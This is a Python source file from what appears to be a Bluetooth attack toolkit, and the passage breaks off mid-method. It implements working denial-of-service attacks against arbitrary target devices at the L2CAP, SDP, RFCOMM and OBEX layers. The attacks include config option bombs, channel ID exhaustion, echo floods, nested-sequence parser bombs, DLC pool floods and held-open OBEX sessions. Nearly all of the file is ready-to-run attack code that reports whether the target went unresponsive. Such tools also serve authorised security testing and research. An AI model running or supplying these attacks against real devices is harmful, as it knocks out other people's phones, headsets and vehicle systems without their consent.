"""Protocol-level Denial-of-Service attacks against Bluetooth targets.

Implements DoS attacks at the L2CAP, SDP, RFCOMM, OBEX, and HFP protocol
layers using standard L2CAP sockets. No special hardware required beyond a
standard Bluetooth adapter.

Attack classes:
  - L2CAPDoS: L2CAP signaling-level resource exhaustion
  - SDPDoS: SDP server state and computation exhaustion
  - RFCOMMDoS: RFCOMM multiplexer and DLC pool exhaustion
  - OBEXDoS: OBEX session and filesystem traversal attacks
  - HFPDoS: HFP AT command flooding and state confusion

All multi-byte L2CAP fields are little-endian per Bluetooth Core Spec Vol 3,
Part A. SDP fields are big-endian per Vol 3, Part B. RFCOMM follows TS 07.10.

Reference: Bluetooth Core Spec v5.4
"""

from __future__ import annotations

import socket
import struct
import time
from typing import Any

from blue_tap.utils.output import info, success, warning, error
from blue_tap.utils.bt_helpers import run_cmd

# Bluetooth socket constants
AF_BLUETOOTH = 31
BTPROTO_L2CAP = 0
BTPROTO_RFCOMM = 3

# L2CAP signaling command codes
L2CAP_CONN_REQ = 0x02
L2CAP_CONF_REQ = 0x04
L2CAP_ECHO_REQ = 0x08
L2CAP_INFO_REQ = 0x0A

# L2CAP signaling CID
CID_SIGNALING = 0x0001

# SDP PDU IDs
SDP_SERVICE_SEARCH_ATTR_REQ = 0x06

# SDP Data Type Descriptors
DTD_UUID16 = 0x19
DTD_DES8 = 0x35
DTD_UINT32 = 0x0A

# Well-known PSMs
PSM_SDP = 0x0001
PSM_RFCOMM = 0x0003

# RFCOMM frame types
RFCOMM_SABM = 0x2F
RFCOMM_UIH = 0xEF
RFCOMM_UA = 0x63

# OBEX opcodes
OBEX_CONNECT = 0x80
OBEX_SETPATH = 0x85


def _make_result(target: str, attack_name: str, packets_sent: int,
                 start_time: float, result: str,
                 notes: str = "") -> dict[str, Any]:
    """Build a standard attack result dict."""
    return {
        "target": target,
        "attack_name": attack_name,
        "packets_sent": packets_sent,
        "duration_seconds": round(time.time() - start_time, 2),
        "result": result,
        "notes": notes,
    }


def _l2cap_raw_socket(hci: str = "hci0") -> socket.socket:
    """Create a raw L2CAP SEQPACKET socket."""
    return socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)


def _l2cap_connect(target: str, psm: int,
                   hci: str = "hci0") -> socket.socket:
    """Connect an L2CAP socket to target on given PSM."""
    sock = _l2cap_raw_socket(hci)
    sock.settimeout(10)
    sock.connect((target, psm))
    return sock


def _build_signaling_cmd(code: int, identifier: int, data: bytes) -> bytes:
    """Build L2CAP signaling command: Code(1) + ID(1) + Length(2 LE) + data."""
    return struct.pack("<BBH", code, identifier, len(data)) + data


def _rfcomm_fcs(data: bytes) -> int:
    """Compute RFCOMM FCS over the given bytes (reversed CRC-8 table)."""
    # TS 07.10 CRC table (polynomial 0xE0)
    crctable = [
        0x00, 0x91, 0xE3, 0x72, 0x07, 0x96, 0xE4, 0x75,
        0x0E, 0x9F, 0xED, 0x7C, 0x09, 0x98, 0xEA, 0x7B,
        0x1C, 0x8D, 0xFF, 0x6E, 0x1B, 0x8A, 0xF8, 0x69,
        0x12, 0x83, 0xF1, 0x60, 0x15, 0x84, 0xF6, 0x67,
        0x38, 0xA9, 0xDB, 0x4A, 0x3F, 0xAE, 0xDC, 0x4D,
        0x36, 0xA7, 0xD5, 0x44, 0x31, 0xA0, 0xD2, 0x43,
        0x24, 0xB5, 0xC7, 0x56, 0x23, 0xB2, 0xC0, 0x51,
        0x2A, 0xBB, 0xC9, 0x58, 0x2D, 0xBC, 0xCE, 0x5F,
        0x70, 0xE1, 0x93, 0x02, 0x77, 0xE6, 0x94, 0x05,
        0x7E, 0xEF, 0x9D, 0x0C, 0x79, 0xE8, 0x9A, 0x0B,
        0x6C, 0xFD, 0x8F, 0x1E, 0x6B, 0xFA, 0x88, 0x19,
        0x62, 0xF3, 0x81, 0x10, 0x65, 0xF4, 0x86, 0x17,
        0x48, 0xD9, 0xAB, 0x3A, 0x4F, 0xDE, 0xAC, 0x3D,
        0x46, 0xD7, 0xA5, 0x34, 0x41, 0xD0, 0xA2, 0x33,
        0x54, 0xC5, 0xB7, 0x26, 0x53, 0xC2, 0xB0, 0x21,
        0x5A, 0xCB, 0xB9, 0x28, 0x5D, 0xCC, 0xBE, 0x2F,
        0xE0, 0x71, 0x03, 0x92, 0xE7, 0x76, 0x04, 0x95,
        0xEE, 0x7F, 0x0D, 0x9C, 0xE9, 0x78, 0x0A, 0x9B,
        0xFC, 0x6D, 0x1F, 0x8E, 0xFB, 0x6A, 0x18, 0x89,
        0xF2, 0x63, 0x11, 0x80, 0xF5, 0x64, 0x16, 0x87,
        0xD8, 0x49, 0x3B, 0xAA, 0xDF, 0x4E, 0x3C, 0xAD,
        0xD6, 0x47, 0x35, 0xA4, 0xD1, 0x40, 0x32, 0xA3,
        0xC4, 0x55, 0x27, 0xB6, 0xC3, 0x52, 0x20, 0xB1,
        0xCA, 0x5B, 0x29, 0xB8, 0xCD, 0x5C, 0x2E, 0xBF,
        0x90, 0x01, 0x73, 0xE2, 0x97, 0x06, 0x74, 0xE5,
        0x9E, 0x0F, 0x7D, 0xEC, 0x99, 0x08, 0x7A, 0xEB,
        0x8C, 0x1D, 0x6F, 0xFE, 0x8B, 0x1A, 0x68, 0xF9,
        0x82, 0x13, 0x61, 0xF0, 0x85, 0x14, 0x66, 0xF7,
        0xA8, 0x39, 0x4B, 0xDA, 0xAF, 0x3E, 0x4C, 0xDD,
        0xA6, 0x37, 0x45, 0xD4, 0xA1, 0x30, 0x42, 0xD3,
        0xB4, 0x25, 0x57, 0xC6, 0xB3, 0x22, 0x50, 0xC1,
        0xBA, 0x2B, 0x59, 0xC8, 0xBD, 0x2C, 0x5E, 0xCF,
    ]
    fcs = 0xFF
    for byte in data:
        fcs = crctable[fcs ^ byte]
    return 0xFF - fcs


def _build_rfcomm_frame(dlci: int, frame_type: int,
                        payload: bytes = b"",
                        pf: int = 1, cr: int = 1) -> bytes:
    """Build an RFCOMM frame per TS 07.10.

    Frame format: Address(1) + Control(1) + Length(1-2) + Data + FCS(1)
    Address byte: EA(1) | CR(1) | DLCI(6)
    """
    addr = (dlci << 2) | (cr << 1) | 0x01  # EA=1
    ctrl = frame_type | (pf << 4)
    length = len(payload)
    if length <= 127:
        length_field = struct.pack("B", (length << 1) | 0x01)  # EA=1
    else:
        length_field = struct.pack("<H", length << 1)  # EA=0, 2 bytes

    # FCS is computed over addr + ctrl (for SABM/UA/DM/DISC)
    # or addr + ctrl for UIH
    if frame_type == RFCOMM_UIH:
        fcs_data = bytes([addr, ctrl])
    else:
        fcs_data = bytes([addr, ctrl])
    fcs = _rfcomm_fcs(fcs_data)

    return bytes([addr, ctrl]) + length_field + payload + bytes([fcs])


# ===========================================================================
# L2CAP DoS
# ===========================================================================

class L2CAPDoS:
    """L2CAP signaling-level denial-of-service attacks.

    Uses raw L2CAP sockets to send signaling commands that exhaust target
    resources: memory (config option bomb), channel IDs (CID exhaustion),
    processing (echo amplification), or signaling bandwidth (info flood).

    Usage:
        dos = L2CAPDoS("AA:BB:CC:DD:EE:FF")
        result = dos.echo_amplification(count=500)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = target
        self.hci = hci

    def config_option_bomb(self, rounds: int = 100) -> dict[str, Any]:
        """Send CONFIG_REQ with dozens of unknown option types (0x80-0xFF).

        Each config request carries unknown options with 255-byte payloads,
        forcing the target to allocate memory for CONFIG_REJ responses.
        Connects to PSM 1 (SDP) to get a valid channel.

        Args:
            rounds: Number of config requests to send.
        """
        info(f"Config option bomb against {self.target} ({rounds} rounds)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to PSM 1: {exc}")
            return _make_result(self.target, "config_option_bomb", 0,
                                start_time, "error", str(exc))

        try:
            for i in range(rounds):
                # Build options: 8 unknown types per round, each 255 bytes
                options = b""
                for opt_type in range(0x80, 0x88):
                    options += struct.pack("<BB", opt_type, 255) + b"\xFF" * 255
                # CONFIG_REQ: DCID(2) + Flags(2) + Options
                # Use CID 0x0040 as placeholder destination
                data = struct.pack("<HH", 0x0040, 0x0000) + options
                cmd = _build_signaling_cmd(L2CAP_CONF_REQ, (i % 254) + 1, data)
                try:
                    sock.send(cmd)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at round {i}, target may have crashed")
                    return _make_result(self.target, "config_option_bomb",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at round {i}")
        finally:
            sock.close()

        success(f"Config option bomb complete: {packets_sent} packets sent")
        return _make_result(self.target, "config_option_bomb", packets_sent,
                            start_time, "success")

    def cid_exhaustion(self, count: int = 200) -> dict[str, Any]:
        """Send rapid L2CAP CONNECTION_REQ with incrementing source CIDs.

        Does NOT send CONFIG_REQ after connection, leaving channels in
        WAIT_CONFIG state until RTX timer cleans them up. Exhausts the
        target's dynamic CID pool.

        Args:
            count: Number of connection requests to send.
        """
        info(f"CID exhaustion against {self.target} ({count} connections)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect: {exc}")
            return _make_result(self.target, "cid_exhaustion", 0,
                                start_time, "error", str(exc))

        try:
            for i in range(count):
                scid = 0x0040 + i  # Incrementing source CIDs
                # CONN_REQ: PSM(2 LE) + SCID(2 LE)
                data = struct.pack("<HH", PSM_SDP, scid)
                cmd = _build_signaling_cmd(L2CAP_CONN_REQ, (i % 254) + 1, data)
                try:
                    sock.send(cmd)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at request {i}, target may be exhausted")
                    return _make_result(self.target, "cid_exhaustion",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at request {i}")
        finally:
            sock.close()

        success(f"CID exhaustion complete: {packets_sent} requests sent")
        return _make_result(self.target, "cid_exhaustion", packets_sent,
                            start_time, "success")

    def echo_amplification(self, count: int = 500,
                           payload_size: int = 672) -> dict[str, Any]:
        """Send L2CAP Echo Requests with maximum payload on signaling CID.

        The target must echo all data back, consuming bandwidth and CPU.
        Uses CID 0x0001 (signaling channel).

        Args:
            count: Number of echo requests to send.
            payload_size: Payload size per echo request (max 672 default).
        """
        info(f"Echo amplification against {self.target} "
             f"({count} echoes, {payload_size}B each)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect: {exc}")
            return _make_result(self.target, "echo_amplification", 0,
                                start_time, "error", str(exc))

        payload = b"\x41" * payload_size
        try:
            for i in range(count):
                cmd = _build_signaling_cmd(L2CAP_ECHO_REQ,
                                           (i % 254) + 1, payload)
                try:
                    sock.send(cmd)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at echo {i}, target may be overwhelmed")
                    return _make_result(self.target, "echo_amplification",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at echo {i}")
        finally:
            sock.close()

        success(f"Echo amplification complete: {packets_sent} echoes sent")
        return _make_result(self.target, "echo_amplification", packets_sent,
                            start_time, "success")

    def info_request_flood(self, count: int = 500) -> dict[str, Any]:
        """Flood L2CAP Information Requests to occupy the signaling channel.

        Alternates between info type 0x0002 (Extended Features) and 0x0003
        (Fixed Channels Supported) to maximize processing load.

        Args:
            count: Number of info requests to send.
        """
        info(f"Info request flood against {self.target} ({count} requests)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect: {exc}")
            return _make_result(self.target, "info_request_flood", 0,
                                start_time, "error", str(exc))

        try:
            for i in range(count):
                # Alternate info types 0x0002 and 0x0003
                info_type = 0x0002 + (i % 2)
                data = struct.pack("<H", info_type)
                cmd = _build_signaling_cmd(L2CAP_INFO_REQ,
                                           (i % 254) + 1, data)
                try:
                    sock.send(cmd)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at request {i}")
                    return _make_result(self.target, "info_request_flood",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at request {i}")
        finally:
            sock.close()

        success(f"Info request flood complete: {packets_sent} requests sent")
        return _make_result(self.target, "info_request_flood", packets_sent,
                            start_time, "success")


# ===========================================================================
# SDP DoS
# ===========================================================================

class SDPDoS:
    """SDP server denial-of-service attacks.

    Targets the SDP server's continuation state table, computational load,
    and recursive parsing via crafted SDP requests over L2CAP PSM 1.

    Usage:
        dos = SDPDoS("AA:BB:CC:DD:EE:FF")
        result = dos.continuation_exhaustion(connections=10)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = target
        self.hci = hci

    def _build_sdp_pdu(self, pdu_id: int, tid: int,
                       params: bytes) -> bytes:
        """Build SDP PDU: ID(1) + TID(2 BE) + ParamLen(2 BE) + params."""
        return struct.pack(">BHH", pdu_id, tid, len(params)) + params

    def _encode_uuid16(self, value: int) -> bytes:
        """Encode a UUID16 SDP data element."""
        return bytes([DTD_UUID16]) + struct.pack(">H", value & 0xFFFF)

    def _encode_des(self, elements: list[bytes]) -> bytes:
        """Encode a Data Element Sequence with uint8 length prefix."""
        body = b"".join(elements)
        if len(body) <= 0xFF:
            return bytes([DTD_DES8, len(body)]) + body
        return bytes([DTD_DES8 + 1]) + struct.pack(">H", len(body)) + body

    def _encode_uint32(self, value: int) -> bytes:
        """Encode a uint32 SDP data element."""
        return bytes([DTD_UINT32]) + struct.pack(">I", value & 0xFFFFFFFF)

    def _build_service_search_attr_req(
        self, uuids: list[int], max_bytes: int = 0xFFFF,
        continuation: bytes = b"\x00", tid: int = 1,
    ) -> bytes:
        """Build ServiceSearchAttributeRequest PDU (0x06)."""
        pattern = self._encode_des([self._encode_uuid16(u) for u in uuids])
        attrs = self._encode_des([self._encode_uint32(0x0000FFFF)])
        params = (pattern + struct.pack(">H", max_bytes)
                  + attrs + continuation)
        return self._build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, tid, params)

    def continuation_exhaustion(self,
                                connections: int = 10) -> dict[str, Any]:
        """Exhaust SDP server continuation state table.

        Opens multiple L2CAP connections to PSM 1, sends
        ServiceSearchAttrReq with MaxAttributeByteCount=7 (minimum allowed),
        receives the first fragment, then does NOT follow up. Each open
        request holds a server-side continuation state entry.

        Args:
            connections: Number of simultaneous SDP connections.
        """
        info(f"SDP continuation exhaustion against {self.target} "
             f"({connections} connections)")
        start_time = time.time()
        packets_sent = 0
        sockets: list[socket.socket] = []

        # Common UUIDs to search for
        uuids = [0x0100, 0x1101, 0x1105, 0x110A, 0x110B, 0x111E]

        try:
            for i in range(connections):
                try:
                    sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
                    sockets.append(sock)

                    # Send request with min MaxAttributeByteCount to force
                    # continuation
                    pdu = self._build_service_search_attr_req(
                        uuids, max_bytes=7, tid=i + 1)
                    sock.send(pdu)
                    packets_sent += 1

                    # Receive first fragment but do NOT send follow-up
                    try:
                        sock.settimeout(5)
                        sock.recv(1024)
                    except socket.timeout:
                        pass

                except (OSError, socket.error) as exc:
                    warning(f"Connection {i} failed: {exc}")
                    if "Connection refused" in str(exc):
                        break
        except Exception as exc:
            error(f"Unexpected error: {exc}")
            return _make_result(self.target, "continuation_exhaustion",
                                packets_sent, start_time, "error", str(exc))

        # Hold connections open briefly to keep state allocated
        time.sleep(2)

        # Clean up
        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass

        result_str = "success" if packets_sent > 0 else "error"
        success(f"Continuation exhaustion complete: {packets_sent} "
                f"sessions held open")
        return _make_result(self.target, "continuation_exhaustion",
                            packets_sent, start_time, result_str,
                            f"{len(sockets)} connections established")

    def large_service_search(self, count: int = 100) -> dict[str, Any]:
        """Send computationally expensive SDP search requests.

        Each request includes 12 UUIDs (spec maximum),
        MaxAttributeByteCount=0xFFFF, and full attribute range 0x0000-0xFFFF.
        Forces the server to search all records against all UUIDs and
        serialize all attributes.

        Args:
            count: Number of expensive requests to send.
        """
        info(f"Large SDP service search against {self.target} "
             f"({count} requests)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to SDP: {exc}")
            return _make_result(self.target, "large_service_search", 0,
                                start_time, "error", str(exc))

        # 12 UUIDs (spec maximum per ServiceSearchPattern)
        uuids = [
            0x0100, 0x0003, 0x0008, 0x000F,  # L2CAP, RFCOMM, OBEX, BNEP
            0x1101, 0x1105, 0x110A, 0x110B,  # SPP, OPP, A2DP Src/Sink
            0x111E, 0x111F, 0x112F, 0x1124,  # HFP, HFP AG, PBAP, HID
        ]

        try:
            for i in range(count):
                pdu = self._build_service_search_attr_req(
                    uuids, max_bytes=0xFFFF, tid=(i % 0xFFFF) + 1)
                try:
                    sock.send(pdu)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at request {i}")
                    return _make_result(self.target, "large_service_search",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at request {i}")
                # Drain response to keep socket alive
                try:
                    sock.settimeout(1)
                    sock.recv(4096)
                except socket.timeout:
                    pass
        finally:
            sock.close()

        success(f"Large service search complete: {packets_sent} requests sent")
        return _make_result(self.target, "large_service_search",
                            packets_sent, start_time, "success")

    def nested_des_bomb(self, depth: int = 100) -> dict[str, Any]:
        """Send SDP request with deeply nested Data Element Sequences.

        Crafts a ServiceSearchPattern containing DES nested to the given
        depth. Each nesting level adds 2 bytes (DTD_DES8 + length).
        Causes recursive parsing load or stack overflow on the target.

        Args:
            depth: Number of DES nesting levels.
        """
        info(f"SDP nested DES bomb against {self.target} (depth={depth})")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to SDP: {exc}")
            return _make_result(self.target, "nested_des_bomb", 0,
                                start_time, "error", str(exc))

        # Build nested DES: innermost contains a UUID16
        inner = self._encode_uuid16(0x0100)  # L2CAP UUID
        for _ in range(depth):
            inner = bytes([DTD_DES8, len(inner)]) + inner

        # Wrap in ServiceSearchPattern DES
        pattern = bytes([DTD_DES8, len(inner)]) + inner
        # MaxAttributeByteCount + AttributeIDList + ContinuationState
        attrs = self._encode_des([self._encode_uint32(0x0000FFFF)])
        params = pattern + struct.pack(">H", 0xFFFF) + attrs + b"\x00"
        pdu = self._build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, 1, params)

        try:
            sock.send(pdu)
            packets_sent = 1
            try:
                sock.settimeout(5)
                sock.recv(1024)
            except socket.timeout:
                warning("No response to nested DES bomb (target may be parsing)")
        except (OSError, socket.error) as exc:
            warning(f"Send failed: {exc}")
            return _make_result(self.target, "nested_des_bomb",
                                packets_sent, start_time,
                                "target_unresponsive", str(exc))
        finally:
            sock.close()

        success(f"Nested DES bomb sent (depth={depth}, "
                f"{len(pdu)} bytes)")
        return _make_result(self.target, "nested_des_bomb", packets_sent,
                            start_time, "success",
                            f"DES depth={depth}, PDU size={len(pdu)} bytes")


# ===========================================================================
# RFCOMM DoS
# ===========================================================================

class RFCOMMDoS:
    """RFCOMM multiplexer denial-of-service attacks.

    Targets the RFCOMM DLC pool, credit-based flow control, and multiplexer
    command processing via crafted RFCOMM frames.

    Usage:
        dos = RFCOMMDoS("AA:BB:CC:DD:EE:FF")
        result = dos.sabm_flood(count=60)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = target
        self.hci = hci

    def sabm_flood(self, count: int = 60) -> dict[str, Any]:
        """Exhaust RFCOMM DLC pool by sending SABM for many DLCIs.

        After multiplexer startup on DLCI 0, sends SABM frames for DLCIs
        2 through count+1. Each SABM opens a new Data Link Connection,
        exhausting the target's DLC pool.

        Args:
            count: Number of DLCIs to open (2 through count+1).
        """
        info(f"RFCOMM SABM flood against {self.target} ({count} DLCIs)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to RFCOMM PSM: {exc}")
            return _make_result(self.target, "sabm_flood", 0,
                                start_time, "error", str(exc))

        try:
            # SABM on DLCI 0 to start multiplexer
            frame = _build_rfcomm_frame(0, RFCOMM_SABM)
            sock.send(frame)
            packets_sent += 1

            # Wait for UA response
            try:
                sock.settimeout(5)
                sock.recv(256)
            except socket.timeout:
                warning("No UA for DLCI 0, continuing anyway")

            # SABM flood on DLCIs 2..count+1
            for dlci in range(2, count + 2):
                frame = _build_rfcomm_frame(dlci, RFCOMM_SABM)
                try:
                    sock.send(frame)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at DLCI {dlci}")
                    return _make_result(self.target, "sabm_flood",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Failed at DLCI {dlci}")
        finally:
            sock.close()

        success(f"SABM flood complete: {packets_sent} frames sent")
        return _make_result(self.target, "sabm_flood", packets_sent,
                            start_time, "success")

    def credit_exhaustion(self) -> dict[str, Any]:
        """Open RFCOMM session with zero credits.

        Opens multiplexer on DLCI 0, then opens multiple DLCIs with initial
        credits set to zero. The target cannot send data back on any channel,
        creating a stalled session consuming resources.
        """
        info(f"RFCOMM credit exhaustion against {self.target}")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to RFCOMM PSM: {exc}")
            return _make_result(self.target, "credit_exhaustion", 0,
                                start_time, "error", str(exc))

        try:
            # Start multiplexer on DLCI 0
            frame = _build_rfcomm_frame(0, RFCOMM_SABM)
            sock.send(frame)
            packets_sent += 1

            try:
                sock.settimeout(5)
                sock.recv(256)
            except socket.timeout:
                pass

            # Open DLCIs with zero credits via PN (Parameter Negotiation)
            # MCC Type 0x20 (PN), CR=1, EA=1
            for dlci in range(2, 12):
                # PN command: DLCI(1) + CL(1) + Priority(1) + Timer(1) +
                #             MaxFrameSize(2 LE) + MaxRetrans(1) + Credits(1)
                pn_data = struct.pack("<BBBBHBB",
                                     dlci,    # DLCI
                                     0xE0,    # CL: credit-based flow, type 0xF
                                     7,       # Priority
                                     0,       # Timer (T1)
                                     127,     # Max frame size
                                     0,       # Max retransmissions
                                     0)       # Initial credits = 0
                # MCC header: Type(1) + Length(1)
                mcc_type = (0x20 << 2) | 0x02 | 0x01  # Type=PN, CR=1, EA=1
                mcc = bytes([mcc_type, (len(pn_data) << 1) | 0x01]) + pn_data
                frame = _build_rfcomm_frame(0, RFCOMM_UIH, mcc, pf=0)
                try:
                    sock.send(frame)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"PN send failed at DLCI {dlci}")
                    break

                # Follow with SABM to open the channel
                sabm = _build_rfcomm_frame(dlci, RFCOMM_SABM)
                try:
                    sock.send(sabm)
                    packets_sent += 1
                except (OSError, socket.error):
                    break

            # Hold session open
            time.sleep(2)
        finally:
            sock.close()

        success(f"Credit exhaustion complete: {packets_sent} frames sent")
        return _make_result(self.target, "credit_exhaustion", packets_sent,
                            start_time, "success",
                            "Zero-credit sessions established")

    def mux_command_flood(self, count: int = 500) -> dict[str, Any]:
        """Flood UIH frames on DLCI 0 with Test commands.

        Sends MCC Test commands (type 0x08) with maximum-length payloads on
        the multiplexer control channel. The target must echo each Test
        command back.

        Args:
            count: Number of Test commands to send.
        """
        info(f"RFCOMM mux command flood against {self.target} "
             f"({count} Test commands)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to RFCOMM PSM: {exc}")
            return _make_result(self.target, "mux_command_flood", 0,
                                start_time, "error", str(exc))

        try:
            # Start multiplexer
            frame = _build_rfcomm_frame(0, RFCOMM_SABM)
            sock.send(frame)
            packets_sent += 1

            try:
                sock.settimeout(5)
                sock.recv(256)
            except socket.timeout:
                pass

            # Flood Test commands on DLCI 0
            # MCC Test type = 0x08, max payload
            test_payload = b"\xAA" * 127  # Max single-byte length
            for i in range(count):
                # MCC: Type(1) + Length(1) + Data
                mcc_type = (0x08 << 2) | 0x02 | 0x01  # Type=Test, CR=1, EA=1
                mcc = (bytes([mcc_type, (len(test_payload) << 1) | 0x01])
                       + test_payload)
                frame = _build_rfcomm_frame(0, RFCOMM_UIH, mcc, pf=0)
                try:
                    sock.send(frame)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at command {i}")
                    return _make_result(self.target, "mux_command_flood",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at command {i}")
        finally:
            sock.close()

        success(f"Mux command flood complete: {packets_sent} commands sent")
        return _make_result(self.target, "mux_command_flood", packets_sent,
                            start_time, "success")


# ===========================================================================
# OBEX DoS
# ===========================================================================

class OBEXDoS:
    """OBEX session denial-of-service attacks.

    Targets OBEX services (OPP, FTP, PBAP, MAP) by exhausting connections
    or creating filesystem traversal load via SETPATH commands.

    Usage:
        dos = OBEXDoS("AA:BB:CC:DD:EE:FF")
        result = dos.connect_flood(count=20)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = target
        self.hci = hci

    def _find_obex_channels(self) -> list[int]:
        """Enumerate RFCOMM channels with OBEX services via SDP.

        Returns list of RFCOMM channel numbers hosting OBEX services.
        """
        channels: list[int] = []
        result = run_cmd([
            "sdptool", "search", "--bdaddr", self.target, "OPUSH"
        ], timeout=15)
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if "Channel:" in line:
                    try:
                        ch = int(line.split("Channel:")[1].strip())
                        if ch not in channels:
                            channels.append(ch)
                    except ValueError:
                        pass

        # Also search for FTP, PBAP, MAP
        for service in ("FTP", "PBAP", "MAP"):
            result = run_cmd([
                "sdptool", "search", "--bdaddr", self.target, service
            ], timeout=15)
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    if "Channel:" in line:
                        try:
                            ch = int(line.split("Channel:")[1].strip())
                            if ch not in channels:
                                channels.append(ch)
                        except ValueError:
                            pass

        return channels

    def _build_obex_connect(self) -> bytes:
        """Build OBEX CONNECT request packet."""
        # CONNECT: Opcode(1) + Length(2 BE) + Version(1) + Flags(1) +
        #          MaxPacketLen(2 BE)
        payload = struct.pack(">BBH", 0x10, 0x00, 0xFFFF)  # v1.0, no flags, max
        length = 3 + len(payload)  # opcode(1) + length(2) + payload
        return struct.pack(">BH", OBEX_CONNECT, length) + payload

    def _build_obex_setpath(self, name: str = "",
                            backup: bool = False) -> bytes:
        """Build OBEX SETPATH request packet.

        Args:
            name: Folder name (empty = root). Encoded as UTF-16BE with
                  Name header (0x01).
            backup: If True, set backup flag (go up one level).
        """
        flags = 0x01 if backup else 0x00
        constants = struct.pack(">BB", flags, 0x00)  # Flags + Constants

        headers = b""
        if name:
            # Name header: HI(1) + Length(2 BE) + UTF-16BE name + null
            name_bytes = name.encode("utf-16-be") + b"\x00\x00"
            headers = struct.pack(">BH", 0x01, 3 + len(name_bytes)) + name_bytes

        length = 3 + len(constants) + len(headers)
        return struct.pack(">BH", OBEX_SETPATH, length) + constants + headers

    def connect_flood(self, count: int = 20) -> dict[str, Any]:
        """Open all OBEX services simultaneously and hold connections.

        Enumerates OBEX channels via SDP, then opens RFCOMM connections to
        all of them. Sends OBEX CONNECT to each and holds sessions open.

        Args:
            count: Maximum number of connections to attempt.
        """
        info(f"OBEX connect flood against {self.target} (max {count})")
        start_time = time.time()
        packets_sent = 0

        channels = self._find_obex_channels()
        if not channels:
            warning("No OBEX channels found via SDP, trying common channels")
            channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

        sockets: list[socket.socket] = []
        connected = 0

        try:
            for i in range(min(count, len(channels) * 3)):
                channel = channels[i % len(channels)]
                try:
                    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
                                         BTPROTO_RFCOMM)
                    sock.settimeout(10)
                    sock.connect((self.target, channel))
                    sockets.append(sock)

                    # Send OBEX CONNECT
                    connect_pkt = self._build_obex_connect()
                    sock.send(connect_pkt)
                    packets_sent += 1
                    connected += 1

                    # Read response but keep connection open
                    try:
                        sock.recv(1024)
                    except socket.timeout:
                        pass

                except (OSError, socket.error) as exc:
                    warning(f"Channel {channel} connection {i} failed: {exc}")
                    continue

            # Hold all connections open
            if sockets:
                time.sleep(5)

        finally:
            for sock in sockets:
                try:
                    sock.close()
                except OSError:
                    pass

        result_str = "success" if connected > 0 else "error"
        success(f"OBEX connect flood complete: {connected} connections held")
        return _make_result(self.target, "connect_flood", packets_sent,
                            start_time, result_str,
                            f"{connected} OBEX sessions on {len(channels)} channels")

    def setpath_loop(self, count: int = 1000) -> dict[str, Any]:
        """Rapidly alternate SETPATH forward/backward to create FS load.

        After OBEX CONNECT, rapidly sends SETPATH requests alternating
        between navigating into directories and backing up. Creates
        filesystem traversal load on the target.

        Args:
            count: Number of SETPATH requests to send.
        """
        info(f"OBEX SETPATH loop against {self.target} ({count} ops)")
        start_time = time.time()
        packets_sent = 0

        channels = self._find_obex_channels()
        if not channels:
            channels = [1, 2, 3, 4, 5]

        sock = None
        try:
            # Try to connect to first available OBEX channel
            for channel in channels:
                try:
                    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
                                         BTPROTO_RFCOMM)
                    sock.settimeout(10)
                    sock.connect((self.target, channel))
                    break
                except (OSError, socket.error):
                    sock = None
                    continue

            if sock is None:
                error("Could not connect to any OBEX channel")
                return _make_result(self.target, "setpath_loop", 0,
                                    start_time, "error",
                                    "No OBEX channels available")

